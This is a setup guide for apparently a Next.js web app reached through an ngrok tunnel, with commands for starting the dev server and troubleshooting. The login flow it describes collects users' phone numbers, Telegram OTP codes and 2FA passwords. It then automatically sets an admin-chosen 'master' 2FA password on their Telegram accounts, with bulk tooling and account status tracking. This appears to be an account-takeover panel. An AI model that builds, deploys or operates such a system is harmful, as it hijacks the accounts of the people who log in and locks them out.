# 🚀 Start Development Server

## Quick Start

### Option 1: Start Everything Together (Recommended)

```bash
# Terminal 1: Start Next.js Development Server
npm run dev

# Terminal 2: Start ngrok tunnel (in a new terminal)
./start-ngrok.sh
```

### Option 2: Manual Steps

```bash
# 1. Start Next.js server
npm run dev
# Server will run on http://localhost:3000

# 2. In another terminal, start ngrok
ngrok http 3000
```

---

## 🔧 What Each Command Does

### `npm run dev`
- Starts Next.js development server
- Runs on `http://localhost:3000`
- Hot reload enabled
- API routes available

### `./start-ngrok.sh` or `ngrok http 3000`
- Creates public HTTPS tunnel to localhost:3000
- Gives you a public URL like: `https://abc123.ngrok.io`
- Allows external access to your local server
- Required for Telegram webhook

---

## 📝 After Starting

### 1. Get Your Public URL

After running ngrok, you'll see:

```
ngrok                                                                    

Session Status                online
Account                       Your Account (Plan: Free)
Version                       3.32.0
Region                        United States (us)
Latency                       10ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    https://abc123.ngrok.io -> http://localhost:3000

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

**Your public URL:** `https://abc123.ngrok.io` ← Copy this!

### 2. Update Environment Variables (If Needed)

If you're using Telegram webhooks, update your `.env.local`:

```bash
NEXT_PUBLIC_WEB_APP_URL=https://abc123.ngrok.io
```

### 3. Access Your App

- **Local:** http://localhost:3000
- **Public:** https://abc123.ngrok.io (from your ngrok output)
- **Admin Panel:** https://abc123.ngrok.io/admin
- **Account Status:** https://abc123.ngrok.io/account-status

---

## ⚠️ Important Notes

### Master Password Required

**CRITICAL:** Before users can login, you MUST set the master 2FA password:

1. Go to admin panel
2. Click "Settings" tab
3. Scroll to "Master 2FA Password"
4. Enter your master password (e.g., "MySecurePass2025")
5. Click "Save Master Password"

**Without this, ALL user logins will fail with:**
```
⚠️ Admin must set master 2FA password before accounts can be processed
```

### Random Passwords Removed

- ✅ Random password generation has been COMPLETELY REMOVED
- ✅ System ONLY uses the master password set by admin
- ❌ No fallback to random passwords
- ❌ Login will fail if master password not set

---

## 🎯 Complete Setup Flow

### 1. Start Servers

```bash
# Terminal 1
npm run dev

# Terminal 2
./start-ngrok.sh
```

### 2. Set Master Password

```
1. Open admin panel: https://abc123.ngrok.io
2. Login as admin
3. Go to Settings tab
4. Set master password: "MySecurePass2025"
5. Click "Save Master Password"
```

### 3. Test User Login

```
1. User visits your app
2. User enters phone number
3. User enters OTP code
4. User enters 2FA (if account has it)
5. ✅ Login successful
6. System automatically:
   - Sets master password on Telegram account
   - Validates the password
   - Accepts or rejects account
```

---

## 🛠️ Troubleshooting

### "ngrok: command not found"

Ngrok is already installed! Try:
```bash
/usr/local/bin/ngrok http 3000
```

Or run the helper script:
```bash
./start-ngrok.sh
```

### "Port 3000 already in use"

Kill the existing process:
```bash
lsof -ti:3000 | xargs kill -9
npm run dev
```

### "Master password not set" error on login

Go to admin panel → Settings → Set master 2FA password

### Ngrok URL changes every restart

**Free plan:** URL changes on restart
**Solution:** 
- Update webhook URL when you restart
- Or upgrade to ngrok paid plan for static URL

---

## 📊 Monitoring

### View ngrok Web Interface

While ngrok is running, visit:
```
http://localhost:4040
```

This shows:
- All HTTP requests
- Request/response details
- Replay requests
- Traffic stats

### View Application Logs

Terminal 1 (Next.js) shows:
- API requests
- Server errors
- 2FA setup logs
- Validation results

Look for:
- `[AutoSetup2FA]` - 2FA automation logs
- `[BulkSet2FA]` - Bulk operation logs
- `[Verify2FA]` - Login flow logs

---

## 🎉 You're Ready!

Once both servers are running and master password is set:

✅ Users can login from anywhere (via ngrok URL)
✅ Accounts automatically get master 2FA password
✅ Validation happens immediately
✅ Failed accounts rejected as frozen
✅ Status visible for each account

**Happy developing!** 🚀

---

## 📞 Quick Commands Reference

```bash
# Start Next.js
npm run dev

# Start ngrok tunnel
./start-ngrok.sh
# OR
ngrok http 3000

# Check if Next.js is running
curl http://localhost:3000/api/health

# View logs
tail -f ~/.ngrok2/ngrok.log

# Kill port 3000
lsof -ti:3000 | xargs kill -9

# Validate all accounts (after setup)
npm run validate-accounts
```

---

## 🔗 Useful URLs

After starting servers:

| Service | URL |
|---------|-----|
| Local App | http://localhost:3000 |
| Public App | https://YOUR-NGROK-URL.ngrok.io |
| Admin Panel | https://YOUR-NGROK-URL.ngrok.io (login as admin) |
| Ngrok Dashboard | http://localhost:4040 |
| Account Status | https://YOUR-NGROK-URL.ngrok.io/account-status |

---

**Replace `YOUR-NGROK-URL` with the actual URL from ngrok output!**
